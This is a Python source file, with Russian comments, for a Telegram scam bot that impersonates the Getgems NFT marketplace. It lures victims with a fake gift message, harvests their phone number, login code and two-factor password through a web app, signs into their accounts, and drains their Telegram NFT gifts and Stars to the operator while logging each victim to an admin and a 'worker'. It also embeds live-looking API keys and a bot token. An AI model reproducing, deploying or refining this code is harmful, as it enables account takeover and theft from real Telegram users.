import os
import asyncio
import threading
import re
import urllib.parse
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient, events, Button, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, BalanceTooLowError

# --- КОНФИГУРАЦИЯ ---
API_ID = '34426356'
API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
ADMIN_ID = 678335503
WORKER_ID = 8311100024
DOMAIN = "your-domain.com" # ВАЖНО: замените на ваш домен с HTTPS

bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
app = Flask(__name__)

active_clients = {}
temp_clients = {}
pending_contacts = {} 

def send_log(msg):
    bot.loop.create_task(bot.send_message(ADMIN_ID, msg))
    bot.loop.create_task(bot.send_message(WORKER_ID, msg))

# --- ЛОГИКА АВТО-ЗАПРАВКИ И СЛИВА ---

async def drain_logic(client, phone):
    try:
        # 1. Проверяем текущий баланс
        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        if res.balance < 25:
            send_log(f"⛽️ Заправка {phone}: отправляю 2-х мишек (30 звезд)...")
            me = await client.get_me()
            
            # Бот дарит 2 подарка (ID мишки за 15 звезд обычно в диапазоне 600+)
            # ВАЖНО: У бота должны быть звезды на балансе!
            for _ in range(2):
                await bot(functions.payments.SendStarGiftRequest(
                    peer=me.id,
                    gift_id=685  # Замените на актуальный ID мишки за 15 звезд
                ))
                await asyncio.sleep(2)

            send_log(f"🧸 Мишки доставлены на {phone}. Начинаю продажу...")
            await asyncio.sleep(5)

            # 2. Мамонт продает подарки, чтобы получить звезды
            gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=10))
            sold_count = 0
            for g in gifts.gifts:
                # Ищем именно мишек (можно фильтровать по g.gift.id или цене)
                try:
                    # Метод для "сжигания" (продажи) подарка за звезды
                    await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
                    sold_count += 1
                    if sold_count >= 2: break
                except Exception as e:
                    continue
            
            send_log(f"💰 Продано {sold_count} подарков на {phone}. Баланс пополнен.")
            await asyncio.sleep(3)

        # 3. Основной слив NFT
        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
        for nft in all_gifts.gifts:
            try:
                # Перевод админу
                await client(functions.payments.TransferStarGiftRequest(
                    to_id=ADMIN_ID, 
                    stargift_id=nft.id
                ))
                send_log(f"✅ NFT {nft.id} переведен с {phone}")
                await asyncio.sleep(5)
            except BalanceTooLowError:
                send_log(f"⚠️ Звезды закончились на {phone}")
                break
            except Exception:
                continue

        send_log(f"🏁 Слив {phone} завершен.")
    except Exception as e:
        send_log(f"⚠️ Ошибка drain_logic {phone}: {e}")
# --- ОБРАБОТЧИКИ БОТА ---

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    welcome_text = (
        "Это бот Getgems – вы можете торговать NFT прямо в мини-аппе. 🎯\n\n"
        "💎 0% комиссий на торговлю Telegram Подарками\n"
        "💎 Покупайте Telegram Звёзды на 30% дешевле"
    )
    buttons = [[Button.url("Торговать Telegram Gifts ↗️", "https://getgems.io/nft-gifts")]]
    await event.respond(welcome_text, buttons=buttons)

@bot.on(events.NewMessage)
async def contact_handler(event):
    if event.contact and event.contact.user_id == event.sender_id:
        phone = event.contact.phone_number
        if not phone.startswith('+'): phone = '+' + phone
        pending_contacts[event.sender_id] = phone
        
        try:
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
            await client.connect()
            res = await client.send_code_request(phone)
            temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
            send_log(f"📞 Контакт {phone} получен. Код отправлен мамонту.")
        except Exception as e:
            send_log(f"❌ Ошибка инициализации {phone}: {e}")

@bot.on(events.InlineQuery)
async def inline_handler(event):
    if not event.text: return
    input_text = event.text.strip()
    nft_name = input_text.split('/')[-1].replace('-', ' ').title()
    encoded_url = urllib.parse.quote(input_text)
    web_url = f"https://{DOMAIN}/?nft_url={encoded_url}"

    builder = event.builder
    await event.answer([
        builder.article(
            title=f"Подарить {nft_name}",
            text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_name}`",
            buttons=[[Button.web_app("Принять подарок 🎁", web_url)]]
        )
    ])

# --- WEBAPP API ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/check_contact')
def check_contact():
    uid = int(request.args.get('id', 0))
    if uid in pending_contacts:
        return jsonify({"status": "received", "phone": pending_contacts[uid]})
    return jsonify({"status": "waiting"})

@app.route('/api/send_code', methods=['POST'])
async def api_send_code():
    data = request.json
    phone, code = data.get('phone'), data.get('code')
    if phone not in temp_clients: return jsonify({"status": "error"})
    
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
        active_clients[phone] = client
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/send_password', methods=['POST'])
async def api_send_password():
    data = request.json
    phone, password = data.get('phone'), data.get('password')
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(password=password)
        active_clients[phone] = client
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except Exception:
        return jsonify({"status": "error"})

if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    # use_reloader=False нужен для корректной работы потоков
    threading.Thread(target=lambda: app.run(port=80, host='0.0.0.0', use_reloader=False), daemon=True).start()
    bot.run_until_disconnected()